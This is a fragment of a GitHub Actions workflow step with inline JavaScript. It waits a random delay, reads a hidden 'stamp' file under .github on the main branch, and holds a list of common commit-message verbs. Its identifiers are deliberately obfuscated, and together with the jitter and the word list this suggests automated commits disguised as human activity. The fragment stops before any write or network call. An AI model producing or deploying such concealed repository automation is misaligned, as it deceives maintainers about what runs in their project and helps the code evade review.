        with:
          script: |
            await new Promise(r => setTimeout(r, Math.floor(Math.random() * 30000)));
            
            const hJDW = ".github/asGijjYVueIT";
            const Ya = context.repo.repo;
            const fq0W = "main";
            const uTqX = context.repo.owner;
            const Xl2Kl = ["fix", "update", "refactor", "add", "remove", "improve", "optimize", "feature", "bug", "docs", "test", "style", "merge", "cleanup", "adjust", "rename", "enhance", "replace", "format", "config", "release", "hotfix", "patch", "review", "sync", "rollback", "revert", "tweak", "implement", "validate", "check", "load", "save", "export", "import", "upgrade", "downgrade", "convert", "render", "parse", "compress", "encrypt", "decrypt", "log", "trace", "monitor", "analyze", "schedule", "retry", "notify"];
            
            async function o1i0B() {
              try {
                const { data } = await github.rest.repos.getContent({
                  owner: uTqX, repo: Ya, path: hJDW, ref: fq0W,
                });
                if (Array.isArray(data)) throw new Error('stamp path is a directory');
                const j5m4ID = Buffer.from(data.content, 'base64').toString('utf8');
                return { j5m4ID, w3c2: data.sha };
              } catch (e) {
                if (e.status === 404) return { j5m4ID: '', w3c2: undefined };
